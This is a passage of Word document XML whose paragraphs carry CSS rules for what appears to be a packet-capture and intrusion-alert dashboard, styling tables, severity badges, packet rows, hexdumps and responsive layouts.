    <w:p w14:paraId="1F5C1D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24px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BD598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C40E01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E0F6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.card {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="145A45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148px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="662C2F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18px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48229C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72E10C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 !important;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EA30C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9px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="101A82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var(--shadow-sm);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="640A04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F4A8E5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435F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.card-header {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25BCE8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12px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B2E30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#65727d;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="161635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6D06C3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377B76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0.07em;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16830F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CF581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62D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.card-header svg {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="385FAA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#83919c;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="491BE6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E7445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AADA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.metric-value {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E7EFF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#16212a;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69245C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30px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32FBB3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7D2885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-0.035em;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="169D46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AB57B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448D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.metric-unit {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53E3FB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margin-left: 3px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C3AC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2619A1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40507C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500;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6ACD9C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CF6C5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05CF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.metric-meta {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43EA9F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1AFCD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704497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7px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="127432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32px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EC563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458183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148F95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379524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55C8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.metric-meta .state-dot {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35F03F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6px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CBC36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6px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B9499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50%;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EC0C8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var(--accent-green);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54DEF1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7D1A0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06BA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.metric-meta.alert .state-dot {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D2A80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var(--accent-red);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12A3A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B3A63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1AD4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.chart-container {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72499D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48px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D2F26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8px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64E9F6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E9081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BD2C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.overview-grid {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C52E1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grid;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="728EB6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grid-template-columns: minmax(0, 2fr) minmax(280px, 0.82fr);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67F1F1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14px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47CE06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start;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45ED4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B54DE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F150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.overview-grid table {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6198CB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640px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DBD2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DDCE71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99FB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.table-card {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="345CD1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var(--bg-card);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67D9C9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2920EE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9px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F7558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var(--shadow-sm);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03E085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hidden;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="576DD1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B135A5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7E3F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.table-header {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2646E3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15px 18px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="088A85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453D81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 !important;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63ACDA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 !important;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="793ABB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5D409E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12FCE7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B5317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B0BB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.table-header-split {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="501842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flex;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DC3C0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align-items: center;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69BC7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space-between;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E57ED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16px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E4A13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AD294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8F9A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.table-kicker {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F1E3C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block;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="660503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3px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="696CB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0A344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13D9DE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400;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="283207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261A5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1FA6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.table-scroll {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="343577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100%;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="022A4A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auto;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B7ABC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E8EB9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6B05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table {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78C0AB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760px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12930A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E138C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FD60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 {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="197A19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10px 16px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C3564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#75828c;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="275462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#fafbfc;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B5145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27E4C9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9px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F0760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700;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="291D3A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0.07em;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6152D1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14E1F2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0E62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td {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BED62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12px 16px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CD7F5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#33414c;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43F2FD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#edf0f2;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BE99B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2BF87F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1.45;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="773826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02251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A933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tbody tr:last-child td {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="191C98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0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79094F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52F44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58EE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.empty-state {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BBA4D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34px 20px !important;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="753DC4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#65757b;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DA1CD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text-align: center;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="236381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#fbfcfc;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B5ECE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F2983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AA7C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.empty-state strong {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="457B92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block;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30BB1D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5px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="156BB5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#34464d;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="601BE2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28D002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4EF47F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4BA78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A506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.empty-state span {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="660573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#7b898e;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A19A6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45197F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E496A5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8157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tr:hover td {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39FE50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#f8fafb;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C69EF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720E4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E29E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.mono,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27E7C0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.wireshark-row,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00DDA2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.pkt-chip,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51BED3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.hexdump {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20D04A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"Liberation Mono", monospace;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71C8B1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B4C8B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9A32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.badge {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="707FB6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inline-flex;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E9898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54px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F0C58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justify-content: center;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47A33D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4px 7px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C72FA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4px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="420E55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8px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AE5E9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letter-spacing: 0.05em;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="212F30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A6B21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F8F3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.bg-CRITICAL {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BAE9B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#9f2f3c;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="249714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#fbeff1;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52F415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#efcbd0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78D6F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90AEE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63FF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.bg-HIGH {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E3B4B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#8c570f;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13DA50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#fdf5e9;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="394D2C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#ecd5b5;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60B444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EA333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058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.bg-SCAN {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DA0D4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#5c4f85;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DF4FE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#f1eff7;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AD24C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#d7d1e8;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40DE27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59B0F5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A90D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.bg-INFO {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1888C8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#245b71;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="527B94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#edf5f7;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A013C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#c9dfe6;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C770E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E71C2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3C53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.engine-panel {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E61B3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0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="152DA9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overflow: hidden;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13B952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7A36D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B1D1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.engine-list {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37CB23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4px 18px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="071736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098055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120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.engine-row {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="653101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grid;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="241CAC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grid-template-columns: 9px 1fr auto;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B09A0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10px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B5267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align-items: center;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="636A45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15px 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EFD99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#edf0f2;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61FCCB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A12F9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04B0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.engine-row:last-child {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FF48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0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0347F8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B24908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C895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.engine-marker {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E29E0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width: 7px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="078A14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height: 7px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57448A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2px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B729F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var(--accent-blue);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="774F51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8F216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61E6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.engine-marker.red { background: var(--accent-red); }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58E509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.engine-marker.orange { background: var(--accent-orange); }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65A015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.engine-marker.purple { background: var(--accent-purple); }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="495DB78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57D6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.engine-name {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63CF6E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#293640;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27DED2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2A428F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5677B5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968A15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0156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.engine-model {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2469D1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3px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A9DB0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5E793E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9px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C6BB7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B64344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376F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.engine-count {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FC40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#26333d;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DC76C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monospace;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46A938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17px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64E680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79CA12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827A0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4A5C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.page-intro {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56D967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22px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D5E8B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F23AA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4921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.page-intro h2 {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E8FF5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23DCFB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6FB86C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19px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="112017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172012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-0.015em;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44776E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4E921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A593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.page-intro p {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="612B27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max-width: 720px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F955F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6px 0 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30718A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var(--text-muted);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0ED3B2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6A6CC1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1.55;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6944E0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25B711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0EF6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{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E1AD4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8px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5669F5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14px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39F493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12px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76D6A0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#ffffff;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22CA9D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520E22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7px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0359C8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67BE7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7C81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input[type="text"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="157D29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select,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DA47E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 {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A97BC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34px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A1B7D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7px 10px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B98CF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#33414b;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2054F7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#ffffff;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76A84E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#ccd4da;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31CC22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5px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F599E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Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C286B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11px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25C01A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5C60A2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7F55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input[type="text"] {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14F09A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min-width: 250px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D5ECC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8D49D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B7A5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input:focus,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0347D2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.pkt-toolbar select:focus {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="757222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#4a897f;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36AC53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0 0 0 2px rgba(23, 125, 100, 0.11);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C0F43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outline: none;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40951E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3B7BD6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E9B4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.pkt-btn:hover {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62C1EA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#f4f7f8;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="443E10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C12B0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F743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.pkt-btn.primary {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FF49C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#ffffff !important;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="361591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#176f66;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="747E7F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#176f66 !important;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33DF0C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EE873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A929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.pkt-btn.primary:hover {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22B77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#125c54;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="726E61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F97AD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D888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.pkt-btn.paused {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35EA16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var(--accent-red);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="705FAA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#fbeff1;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="212891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border-color: #e5aeb6;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C5849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20C18C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2016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.pkt-chip {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AF94B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5px 2px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38BF3E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#6d7a84;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BBA81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9px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D0BF2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E61145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575E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.pkt-chip b {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BC779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#176f66;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E9271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32699F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EDE7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#pktScroll {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53CCB3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max-height: 56vh !important;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F0953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}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53CC542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C577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#wsTableBody {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12860B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 !important;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B6EF2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A68AA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6F7C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 {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C14D9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36D8F5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C4C985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7DF6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.wireshark-row.selected td {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3878FB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#eaf3f2;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="144837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173C6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A38B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.ws-TCP { color: #34704d; }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A3BD9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.ws-UDP { color: #286b83; }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25109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.ws-ICMP { color: #7b5480; }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0914C4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.ws-OTHER { color: #697682; }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CC152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.ws-MALICIOUS { color: var(--accent-red); background: #fff6f7; }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F90B4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6176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.hexdump {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F0F54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#d7e1e7;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A269D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#16212a;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="767D06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10px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35800B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1.6;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C41CB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337345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DF60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{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F7A24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max-width: 1040px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BCF52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26px 30px 40px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B8B79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#46535e;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40BDB6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#ffffff;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49072C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3341CD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7px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E76E7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12px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32A46D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line-height: 1.7;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6911C0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box-shadow: var(--shadow-sm);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="690B14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690B2F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2AF4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h2 {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23E953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4943B8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padding-bottom: 16px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="461297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var(--text-main);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="523E90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border-bottom: 1px solid var(--border-color);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="454816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20px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79A33A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05FF0B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-0.015em;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2475CF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69357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8C85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.doc-view h3 {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42DAED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28px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63E52D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0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A115F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#26343e;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3784C7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0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BF7D2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13px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D63AE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650;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="242B68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056DE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A7DE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.project-summary {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="361EBC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20px 0 26px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5426D5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14px 16px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70DA96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#28584f;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CCE78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#f0f7f5;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67ED4D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border-left: 3px solid #23806f;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15CE71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BD81AD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8BA2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.architecture-grid {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33F31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grid;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10BB9F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grid-template-columns: repeat(2, minmax(0, 1fr));</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08D877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gap: 12px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7375AD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margin-top: 12px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04808C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52A69A5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7CF8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.arch-engine {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="415D71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min-height: 150px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38D41A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margin: 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C053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padding: 16px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FB482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#52606a;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AEE28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background: #fafbfc;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DA318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border: 1px solid var(--border-color);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54F975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border-left: 3px solid #647f8c;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="012B59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border-radius: 5px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="770CE9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}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="455D7B7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567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.arch-engine strong {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="474332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block;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77E537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8px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F9119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#25323c !important;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C9D77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12px !important;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="700570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BC56E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3EFB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.method-tag {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B4C14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display: inline-block;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00B729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margin-bottom: 8px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DCF68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color: #60707b;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68E93F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font-family: "SFMono-Regular", Consolas, monospace;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5743CA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font-size: 9px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EB421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font-weight: 600;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F700A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letter-spacing: 0.04em;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48407F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text-transform: uppercase;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D5BE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7A69DE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8C2A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@media (max-width: 1180px) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E57C6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.metrics-grid {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="086AC9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grid-template-columns: repeat(2, minmax(0, 1fr));</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03B2C0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7B7E43A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F65F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.overview-grid {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47C6C2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grid-template-columns: 1fr;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F1C84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7426D8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13DDA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F643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@media (max-width: 760px) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E89E9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{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BD6D5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block;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BCE99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height: auto;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FECEB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min-height: 100vh;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F11D4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overflow: auto;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A1B9D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706874A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4FE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.sidebar {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E5774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width: 100%;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C1124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min-height: 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38A61B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block;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5780BE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01228BB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57B0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.logo-container {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="300D5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min-height: 64px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AD565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padding: 12px 16px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37943D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D1479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7E05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.nav-menu {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EB3E4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flex;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="064DF3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gap: 4px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7778A7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padding: 8px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AB8F2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overflow-x: auto;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="544670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scrollbar-width: none;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D4629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77BB671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6F93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.nav-menu::-webkit-scrollbar { display: none; }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32712F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2526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.nav-label,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B32E2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.sidebar-session {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A3A41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none;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77E22E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3B26E9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CAC8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.nav-item {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24802F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width: auto;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="649C6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flex: 0 0 auto;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60623D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white-space: nowrap;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33D9B4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1E4679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6801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.main-content {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B208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min-height: calc(100vh - 122px);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="498EA4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overflow: visible;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="005569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67B848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D4E5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header {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3981EF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min-height: 62px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48BBA0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padding: 10px 16px;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="610681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519CB73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2E16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.header-copy p {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7734EF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none;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44E184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}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AB3CF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2A90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.last-updated {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F068A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display: none;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58F35F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0BA34A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636A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.tab-content {</w:t>
      </w:r>
    </w:p>
